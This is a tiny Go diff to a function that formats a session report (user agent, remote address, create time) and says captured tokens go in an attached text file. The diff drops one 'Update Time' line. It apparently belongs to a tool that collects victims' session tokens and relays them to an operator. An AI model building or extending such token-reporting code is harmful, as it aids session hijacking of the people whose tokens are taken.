@@ -182,7 +182,6 @@ func formatSessionMessage(session Session) string {
 		"🖥️ User Agent:    ➖ %s\n"+
 		"🌍 Remote Address:➖ %s\n"+
 		"🕒 Create Time:   ➖ %d\n"+
-		"🕔 Update Time:   ➖ %d\n"+
 		"\n"+
 		"📦 Tokens are added in txt file and attached separately in message.\n",
 
